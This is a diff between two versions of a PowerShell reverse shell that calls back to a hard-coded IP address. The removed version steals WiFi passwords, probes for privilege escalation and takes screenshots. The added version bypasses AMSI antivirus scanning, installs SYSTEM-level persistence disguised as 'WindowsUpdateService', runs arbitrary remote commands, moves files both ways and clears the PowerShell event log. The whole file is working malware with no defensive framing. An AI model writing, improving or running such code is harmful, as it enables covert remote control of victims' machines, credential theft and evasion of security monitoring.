@@ -1,177 +1,153 @@
-# reverse_shell.ps1 - Persistent reverse shell with advanced features
-$serverIP = "147.185.221.31"  # ← UPDATE WITH YOUR ARCH IP
+# Enhanced Reverse Shell with SSL Encryption, Persistence and Stealth
+$serverIP = "147.185.221.31"  # UPDATE WITH YOUR SERVER IP
 $serverPort = 47034
-$reconnectDelay = 15  # Seconds to wait before reconnecting
-$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"
+$maxRetryDelay = 300  # Maximum delay between connection attempts (5 minutes)
+$minRetryDelay = 10   # Minimum delay between connection attempts
 
-# Function to get detailed system information
+# AMSI Bypass to evade antivirus detection
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
 function Get-SystemInfo {
     $hostname = $env:COMPUTERNAME
     $username = $env:USERNAME
     $os = (Get-WmiObject Win32_OperatingSystem).Caption
     $domain = (Get-WmiObject Win32_ComputerSystem).Domain
-    $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
-    $antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName
-    return "SYSINFO:$hostname|$username|$os|$domain|$ipAddress|$antivirus"
+    $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPv4Address.IPAddressToString
+    return "SYSINFO:$hostname|$username|$os|$domain|$ipAddress"
 }
 
-# Function to dump WiFi passwords
-function Get-WifiPasswords {
-    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
-    $results = @()
-    
-    foreach ($profile in $wifiProfiles) {
-        $profileInfo = netsh wlan show profile name="$profile" key=clear
-        $password = ($profileInfo | Select-String "Key Content").ToString().Split(":")[1].Trim()
-        $results += "WIFI:$profile|$password"
-    }
-    
-    return $results -join "`n"
+function Invoke-ExponentialBackoff {
+    param($retryCount)
+    $delay = [math]::Min($minRetryDelay * [math]::Pow(2, $retryCount), $maxRetryDelay)
+    $jitter = Get-Random -Minimum 0 -Maximum ($delay * 0.2)  # Add 20% jitter
+    return $delay + $jitter
 }
 
-# Function to dump browser credentials (Chrome)
-function Get-BrowserCredentials {
-    $results = @()
+function Install-Persistence {
+    $taskName = "WindowsUpdateService"
+    $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
     
-    try {
-        # Chrome credentials path
-        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromePath) {
-            # This is a simplified approach - real implementation would require SQLite and decryption
-            $results += "CHROME:Credentials found at $chromePath (decryption required)"
-        }
-    } catch { }
-
-    return $results -join "`n"
-}
-
-# Function to check for privilege escalation vectors
-function Get-PrivEscVectors {
-    $results = @()
-    
-    # Check for unquoted service paths
-    $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' }
-    foreach ($service in $services) {
-        $results += "PRIVESC:Unquoted service path - $($service.Name): $($service.PathName)"
-    }
-    
-    # Check for always install elevated
-    $alwaysInstallElevated = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
-    if ($alwaysInstallElevated -eq 1) {
-        $results += "PRIVESC:AlwaysInstallElevated enabled"
-    }
-    
-    return $results -join "`n"
-}
-
-# Function to establish persistence
-function Set-Persistence {
-    try {
-        # Copy self to persistent location
-        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $localPayloadPath -Force
-        
-        # Create scheduled task for persistence
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`""
+    if (-not $taskExists) {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $(ToBase64 $MyInvocation.MyCommand.ScriptContents)"
         $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
-        Register-ScheduledTask -TaskName "WindowsUpdateService" -InputObject $task -Force
-        
-        return "PERSISTENCE:Scheduled task created successfully"
-    } catch {
-        return "PERSISTENCE:Error - $($_.Exception.Message)"
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
     }
 }
 
-# Function to take a screenshot
-function Get-Screenshot {
+function ToBase64 {
+    param($string)
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($string)
+    return [Convert]::ToBase64String($bytes)
+}
+
+function Invoke-SafeCommand {
+    param($command)
     try {
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        
-        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
-        
-        $memoryStream = New-Object System.IO.MemoryStream
-        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
-        $bytes = $memoryStream.ToArray()
-        $base64 = [Convert]::ToBase64String($bytes)
-        
-        $graphics.Dispose()
-        $bitmap.Dispose()
-        $memoryStream.Dispose()
-        
-        return "SCREENSHOT:$base64"
-    } catch {
-        return "SCREENSHOT:Error - $($_.Exception.Message)"
+        # Use .NET methods instead of iex to avoid command logging
+        $scriptBlock = [ScriptBlock]::Create($command)
+        $result = $scriptBlock.Invoke() 2>&1 | Out-String
     }
+    catch {
+        $result = "ERROR: $($_.Exception.Message)"
+    }
+    return $result
 }
 
-# Function to handle special commands
-function Invoke-SpecialCommand {
-    param($Command)
+function Transfer-File {
+    param($direction, $path, $content = $null)
     
-    switch -Regex ($Command) {
-        "^!wifi" { return Get-WifiPasswords }
-        "^!browsers" { return Get-BrowserCredentials }
-        "^!privesc" { return Get-PrivEscVectors }
-        "^!persist" { return Set-Persistence }
-        "^!screenshot" { return Get-Screenshot }
-        "^!sysinfo" { return Get-SystemInfo }
-        default { return "ERROR:Unknown special command" }
+    try {
+        if ($direction -eq "upload" -and $content) {
+            $bytes = [Convert]::FromBase64String($content)
+            [System.IO.File]::WriteAllBytes($path, $bytes)
+            return "File uploaded successfully to $path"
+        }
+        elseif ($direction -eq "download" -and (Test-Path $path)) {
+            $bytes = [System.IO.File]::ReadAllBytes($path)
+            return [Convert]::ToBase64String($bytes)
+        }
+        else {
+            return "ERROR: File not found or invalid operation"
+        }
+    }
+    catch {
+        return "ERROR: $($_.Exception.Message)"
     }
 }
 
-# Main persistent loop (NEVER EXITS)
+# Main execution
+$retryCount = 0
+Install-Persistence
+
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TCPClient
         $client.Connect($serverIP, $serverPort)
-        
         $stream = $client.GetStream()
-        $writer = New-Object System.IO.StreamWriter($stream)
-        $writer.AutoFlush = $true
-        $reader = New-Object System.IO.StreamReader($stream)
         
-        # Send system info upon connection
+        # Wrap with SSL stream for encryption
+        $sslStream = New-Object System.Net.Security.SslStream($stream, $false, 
+            { param($s, $c, $ch, $e) return $true })
+        $sslStream.AuthenticateAsClient($serverIP)
+        
+        $writer = New-Object System.IO.StreamWriter($sslStream)
+        $writer.AutoFlush = $true
+        $reader = New-Object System.IO.StreamReader($sslStream)
+        
+        # Send system information
         $writer.WriteLine((Get-SystemInfo))
+        $retryCount = 0  # Reset retry counter on successful connection
         
         # Command execution loop
         while ($true) {
             try {
                 $command = $reader.ReadLine()
-                if (-not $command) { break }  # Server closed connection
+                if (-not $command) { break }
                 
-                if ($command -eq "exit") { break }
-                
-                # Check if it's a special command
-                if ($command -match "^!") {
-                    $result = Invoke-SpecialCommand $command
+                # Handle special commands
+                if ($command.StartsWith("download ")) {
+                    $filePath = $command.Substring(9)
+                    $result = Transfer-File "download" $filePath
                     $writer.WriteLine($result)
-                    continue
                 }
-                
-                # Execute regular command
-                $result = iex $command 2>&1 | Out-String
-                $writer.WriteLine($result)
+                elseif ($command.StartsWith("upload ")) {
+                    $parts = $command.Split(" ", 3)
+                    $filePath = $parts[1]
+                    $fileContent = $parts[2]
+                    $result = Transfer-File "upload" $filePath $fileContent
+                    $writer.WriteLine($result)
+                }
+                elseif ($command -eq "exit") { 
+                    break 
+                }
+                elseif ($command -eq "clear-log") {
+                    wevtutil cl "Windows PowerShell" 2>$null
+                    $result = " PowerShell event log cleared"
+                    $writer.WriteLine($result)
+                }
+                else {
+                    # Execute regular command
+                    $result = Invoke-SafeCommand $command
+                    $writer.WriteLine($result)
+                }
             }
             catch {
-                # Send error but KEEP CONNECTION ALIVE
-                $errorOutput = "ERROR: $($_.Exception.Message)`n"
-                $writer.WriteLine($errorOutput)
+                # Send error but keep connection alive
+                $writer.WriteLine("ERROR: $($_.Exception.Message)")
             }
         }
     }
     catch {
-        # Connection failed, but we'll retry
+        # Connection failed, will retry
     }
     finally {
         if ($client) { $client.Close() }
     }
     
-    # Wait before reconnecting
-    Start-Sleep -Seconds $reconnectDelay
+    # Wait with exponential backoff before reconnecting
+    $delay = Invoke-ExponentialBackoff $retryCount
+    Start-Sleep -Seconds $delay
+    $retryCount++
 }
